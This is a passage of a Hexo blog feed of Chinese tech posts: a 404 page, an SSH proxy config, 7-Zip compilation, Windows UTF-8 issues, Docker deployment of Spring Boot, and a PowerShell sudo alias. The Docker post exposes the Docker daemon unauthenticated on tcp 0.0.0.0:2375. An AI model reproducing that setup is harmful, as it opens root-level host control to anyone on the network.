class="string">"cover-para w3ls"</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span> <span class="attr">class</span>=<span class="string">"form-title"</span>&gt;</span>UH OH! You're lost.<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"form-text"</span>&gt;</span>The page you are looking for does not exist. How you got here is a mystery. But you can click the button below to go back to the previous page <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.go(-1);"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Go Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>后来发现只要放在主题文件夹的source就能输出完整页面了，如\themes\xxxxxx\source,如下代码所示，消失的标签又回来了。</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">"The page you are looking for does not exist."</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/404/css/style.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">media</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/404/css/font-awesome.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"error-page"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"covers-main w3layouts"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main-cover w3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.html"</span> <span class="attr">class</span>=<span class="string">"logo"</span>&gt;</span>Web Error Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"cover-para w3ls"</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span> <span class="attr">class</span>=<span class="string">"form-title"</span>&gt;</span>UH OH! You're lost.<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"form-text"</span>&gt;</span>The page you are looking for does not exist. How you got here is a mystery. But you can click the button below to go back to the previous page <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:history.go(-1);"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Go Back<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> <span class="attr">class</span>=<span class="string">"back-button"</span>&gt;</span>Back to Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">"https://static.cloudflareinsights.com/beacon.min.js"</span> <span class="attr">data-cf-beacon</span>=<span class="string">'{"rayId":"69596e22ad08eb79","version":"2021.8.1","r":1,"token":"4c34ab8739eb4bf09573777b5c48b854","si":10}'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10 给 ssh 加上代理</title>
      <link href="/posts/3664919065/"/>
      <url>/posts/3664919065/</url>
      
        <content type="html"><![CDATA[<p>直接编辑<code>~/.ssh/config</code>，没有就创建一个</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ProxyCommand C:\Program Files\Git\mingw64\bin\connect.exe -S 127.0.0.1:10808 -a none %h %p</span><br><span class="line"></span><br><span class="line">Host github.com</span><br><span class="line">  User git</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname github.com</span><br><span class="line">  IdentityFile <span class="string">"C:\Users\xiaobai\.ssh\id_rsa"</span></span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">Host ssh.github.com</span><br><span class="line">  User git</span><br><span class="line">  Port 443</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  <span class="comment"># 注意修改路径为你的路径</span></span><br><span class="line">  IdentityFile <span class="string">"C:\Users\xiaobai\.ssh\id_rsa"</span></span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7zip的编译</title>
      <link href="/posts/25908/"/>
      <url>/posts/25908/</url>
      
        <content type="html"><![CDATA[<h4 id="编译7z-dll"><a href="#编译7z-dll" class="headerlink" title="编译7z.dll"></a>编译7z.dll</h4><h5 id="1-下载源代码并打开"><a href="#1-下载源代码并打开" class="headerlink" title="1.下载源代码并打开"></a>1.下载源代码并打开</h5><p>下载地址：<a href="https://www.7-zip.org/download.html">https://www.7-zip.org/download.html</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25908/image-20200702201430649.png" alt="image-20200702201430649"></p><p>用vs打开%7z_source%\CPP\7zip\Bundles\Format7zF\Format7z.dsw</p><p>在7zCrcOpt.asm和AesOpt.asm两个文件上右键属性，修改其配置信息，如图</p><p>这里是由于作者用的VB6，你打开宏设置就知道这个路径是在<a href="https://visualstudio.microsoft.com/vs/">Visual Studio 2019</a>是错的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25908/image-20200702145129113.png" alt="image-20200702145129113"></p><p>如果要编译64位的</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25908/image-20200702151131634.png" alt="image-20200702151131634"></p><p>对于 error LNK2026 模块对于 SAFESEH 映像是不安全的解决</p><p>在其它选项添加如下内容</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/SAFESEH:NO </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/25908/image-20200702145334265.png" alt="image-20200702145334265"></p><h5 id="2-编译"><a href="#2-编译" class="headerlink" title="2.编译"></a><strong>2.编译</strong></h5><p>7z.dlll文件会编译到你链接器部分设置的位置</p><blockquote><p>其他部分考完试再更新</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>设置Windows10的默认编码为UTF-8以及设置后的已知问题</title>
      <link href="/posts/49861/"/>
      <url>/posts/49861/</url>
      
        <content type="html"><![CDATA[<h4 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a>设置方法</h4><p>设置方法：控制面板-&gt;区域-&gt;管理&gt;更改系统区域设置</p><p>设置好后，重启，系统编码即变为UTF-8格式。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702124934940.png" alt="image-20200702124934940"></p><h4 id="已知问题："><a href="#已知问题：" class="headerlink" title="已知问题："></a>已知问题：</h4><blockquote><p>刚开始使用，还没发现更多问题，后期会继续添加</p></blockquote><h5 id="1-自定义配置文件乱码"><a href="#1-自定义配置文件乱码" class="headerlink" title="1.自定义配置文件乱码"></a>1.自定义配置文件乱码</h5><p>如下图，我在一个文件夹内写入如下内容，让文件夹显示我自定义的中文名，但是当我设置Windows为UTF-8后，此文件不会被自动更改，需要手动更改为UTF-8后方能正常使用，不然文件夹显示会乱码</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702124519257.png" alt="image-20200702124519257"></p><h5 id="2-7-ZIP和WinRAR以及Windows资源管理器-打开GBK编码的zip会乱码"><a href="#2-7-ZIP和WinRAR以及Windows资源管理器-打开GBK编码的zip会乱码" class="headerlink" title="2.7-ZIP和WinRAR以及Windows资源管理器 打开GBK编码的zip会乱码"></a>2.7-ZIP和WinRAR以及Windows资源管理器 打开GBK编码的zip会乱码</h5><p>WinRAR 版本 5.90 简体中文版 </p><p>7ZIP版本：19.00</p><p>Windows 版本：19041.329</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702125403723.png" alt="image-20200702125403723"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702125537141.png" alt="image-20200702125537141"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702125557146.png" alt="image-20200702125557146"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702125703849.png" alt="image-20200702125703849"></p><h5 id="3-chm帮助文件查看器打开中文乱码"><a href="#3-chm帮助文件查看器打开中文乱码" class="headerlink" title="3.chm帮助文件查看器打开中文乱码"></a>3.chm帮助文件查看器打开中文乱码</h5><p>如下图所示，此处文件名没有乱码，但是打开后标题乱码，还有搜索时会乱码，索引和其他页面未发现乱码。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702130035351.png" alt="image-20200702130035351"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/49861/image-20200702130123997.png" alt="image-20200702130123997"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IDEA docker部署springboot项目</title>
      <link href="/posts/27992/"/>
      <url>/posts/27992/</url>
      
        <content type="html"><![CDATA[<h4 id="一、docker服务器侧监听配置"><a href="#一、docker服务器侧监听配置" class="headerlink" title="一、docker服务器侧监听配置"></a>一、docker服务器侧监听配置</h4><p>centos7安装配置docker参考《<a href="https://www.cnblogs.com/zhouyu629/p/12447051.html">centos下docker安装</a>》</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service，配置完端口，下面的idea中才能连接成功。</span><br></pre></td></tr></tbody></table></figure><p> 默认使用2375端口监听，如果开有防火墙，需要把端口添加到例外。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStart=``/usr/bin/dockerd` `-H fd:``//` `--containerd=``/run/containerd/containerd``.sock -H tcp:``//0``.0.0.0:2375</span><br></pre></td></tr></tbody></table></figure><h4 id="二、插件安装和配置"><a href="#二、插件安装和配置" class="headerlink" title="二、插件安装和配置"></a>二、插件安装和配置</h4><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/27832-20200311095157924-52880106.png" alt="img"></p><p>配置docker连接，一定要显示Connection succcessful：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/27832-20200311095752524-2049075091.png" alt="img"></p><h4 id="三、springboot项目，增加docker插件和Dockerfile配置"><a href="#三、springboot项目，增加docker插件和Dockerfile配置" class="headerlink" title="三、springboot项目，增加docker插件和Dockerfile配置"></a>三、springboot项目，增加docker插件和Dockerfile配置</h4><ol><li>依赖包和配置</li></ol><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;com.spotify&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;version&gt; 1.2.1&lt;/version&gt;</span><br><span class="line">                &lt;executions&gt;</span><br><span class="line">                    &lt;execution&gt;</span><br><span class="line">                        &lt;id&gt;build-image&lt;/id&gt;</span><br><span class="line">                        &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">                        &lt;goals&gt;</span><br><span class="line">                            &lt;goal&gt;build&lt;/goal&gt;</span><br><span class="line">                        &lt;/goals&gt;</span><br><span class="line">                    &lt;/execution&gt;</span><br><span class="line">                &lt;/executions&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;imageName&gt;${project.artifactId}&lt;/imageName&gt;</span><br><span class="line">                    &lt;imageTags&gt;</span><br><span class="line">                        &lt;imageTag&gt;latest&lt;/imageTag&gt;</span><br><span class="line">                    &lt;/imageTags&gt;</span><br><span class="line">                    &lt;dockerDirectory&gt;${project.basedir}&lt;/dockerDirectory&gt;</span><br><span class="line">                    &lt;dockerHost&gt;http://10.245.202.222:2375&lt;/dockerHost&gt;</span><br><span class="line">                    &lt;resources&gt;</span><br><span class="line">                        &lt;resource&gt;</span><br><span class="line">                            &lt;targetPath&gt;/&lt;/targetPath&gt;</span><br><span class="line">                            &lt;directory&gt;${project.build.directory}&lt;/directory&gt;</span><br><span class="line">                            &lt;include&gt;${project.build.finalName}&lt;/include&gt;</span><br><span class="line">                        &lt;/resource&gt;</span><br><span class="line">                    &lt;/resources&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br></pre></td></tr></tbody></table></figure><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/copycode.gif" alt="复制代码"></a></p><p>我一开始建了一个docker的文件夹，将dockerfile放到那里，实践证明不行，不允许往上层路径寻找jar包。</p><p>\2. Dockerfile配置</p><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/copycode.gif" alt="复制代码"></a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#指定基础镜像，在其上进行定制</span><br><span class="line">FROM java:8</span><br><span class="line"></span><br><span class="line">#维护者信息</span><br><span class="line">MAINTAINER zhouyu &lt;zhouyu629@qq.com&gt;</span><br><span class="line"></span><br><span class="line">#这里的 /tmp 目录就会在运行时自动挂载为匿名卷，任何向 /tmp 中写入的信息都不会记录进容器存储层。</span><br><span class="line">VOLUME /tmp</span><br><span class="line"></span><br><span class="line">#复制上下文目录下的target/demo-1.0.0.jar 到容器里</span><br><span class="line">COPY target/freemarker-page-demo-1.0-SNAPSHOT.jar demo-1.0.0.jar</span><br><span class="line"></span><br><span class="line">#bash方式执行，使demo-1.0.0.jar可访问</span><br><span class="line">#RUN新建立一层，在其上执行这些命令，执行结束后， commit 这一层的修改，构成新的镜像。</span><br><span class="line">RUN bash -c "touch /demo-1.0.0.jar"</span><br><span class="line"></span><br><span class="line">#声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务</span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">#指定容器启动程序及参数   &lt;ENTRYPOINT&gt; "&lt;CMD&gt;"</span><br><span class="line">ENTRYPOINT ["java","-jar","demo-1.0.0.jar"]</span><br></pre></td></tr></tbody></table></figure><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/copycode.gif" alt="复制代码"></a></p><p>执行mvn package成功</p><p> \3. 创建容器</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/27832-20200311202127728-810429757.png" alt="img"></p><p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/27832-20200311100136847-977682787.png" alt="img"></p><p>注意bind ports，我这里是8080:8088，前面是服务器向外暴露的端口号，8088则是application.yml里配置的应用端口号，我这里对应的tomcat端口号。</p><h4 id="四、主要问题解决"><a href="#四、主要问题解决" class="headerlink" title="四、主要问题解决"></a>四、主要问题解决</h4><p>1.xxxx-1.0-SNAPSHOT.jar中没有主清单属性 ，造成发布失败。</p><p>主要是因为springboot没有配置maven package插件，pom中新增plugin</p><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/copycode.gif" alt="复制代码"></a></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><a href="javascript:void(0);"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/27992/copycode.gif" alt="复制代码"></a></p><ol start="2"><li>容器时间和宿主时间不一致</li></ol><p>在Dockerfile最后一行增加：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置时区</span></span><br><span class="line">RUN /bin/cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \</span><br><span class="line">  &amp;&amp; echo 'Asia/Shanghai' &gt;/etc/timezone \</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Java </tag>
            
            <tag> Springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给你的Powershell做一个“sudo”</title>
      <link href="/posts/58638/"/>
      <url>/posts/58638/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p></blockquote><h2 id="开始行动"><a href="#开始行动" class="headerlink" title="开始行动"></a>开始行动</h2><p>在Windows系统上sudo对应的就是管理员权限了。</p><p>一般使用Powershell时，并不会管理员启动，当执行需要权限的命令（比如net start mysql），就需要以管理员打开新的窗口。</p><p>为了一步到位，这里给powershell创建一个<code>alias</code> -&gt; <code>sudo</code> 来运行需要管理员权限的命令。</p><p>在文档目录中(在<code>powershell</code>执行<code>$profile</code>即可输出此文件路径)，新建文件夹<code>WindowsPowerShell</code>，新建文件<code>Microsoft.PowerShell_profile.ps1</code>。</p><blockquote><p>此文件是在启动Powershell时执行的脚本。set-alias 在退出后就会失效，所以放到启动脚本中。</p></blockquote><p>追加如下代码,<strong>然后重启Powershell窗口。</strong></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_sudo</span></span> {</span><br><span class="line">    <span class="variable">$ss</span> = <span class="string">"<span class="variable">$args</span> ; pause"</span></span><br><span class="line">    <span class="built_in">Start-Process</span> powershell <span class="literal">-Verb</span> runAs <span class="literal">-ArgumentList</span> <span class="variable">$ss</span></span><br><span class="line">}</span><br><span class="line"><span class="built_in">set-alias</span>  <span class="literal">-name</span> sudo <span class="literal">-value</span> _sudo</span><br></pre></td></tr></tbody></table></figure><p>保存后发现无法加载，因为默认不加载外部脚本，管理员权限下 powershell 运行：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></tbody></table></figure><blockquote><p> <strong>REMOTESIGNED</strong> 脚本可以运行。这是 Windows Server 2012 R2 中的默认执行策略。 要求从 Internet 下载的脚本和配置文件（包括电子邮件和即时消息程序）具有受信任的发布者的数字签名。 不要求你在本地计算机上编写的脚本（不是从 Internet 下载的）具有数字签名。 如果脚本已被取消阻止（比如通过使用 Unblock-File cmdlet），则运行从 Internet 下载但未签名的脚本。 存在运行来自 Internet 之外的源的未签名脚本和已签名但却是恶意的脚本的风险。</p></blockquote><p>完成设置后，输入sudo会打开新的窗口执行命令:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/58638/image-20201114173152782.png" alt="image-20201114173152782"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/58638/20191015105843814.png" alt="在这里插入图片描述"></p><p>有时候我们又希望直接输入命令打开新窗口,继续追加如下代码，重启powershell</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">_su</span></span> {<span class="built_in">Start-Process</span> <span class="literal">-verb</span> runas <span class="string">"C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe"</span>}</span><br><span class="line"><span class="built_in">Set-Alias</span> su _su</span><br></pre></td></tr></tbody></table></figure><p>输入su命令后会直接弹出一个新的具有管理员权限的powershell</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/58638/image-20201114173232592.png"></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="cmd-提权："><a href="#cmd-提权：" class="headerlink" title="cmd 提权："></a>cmd 提权：</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 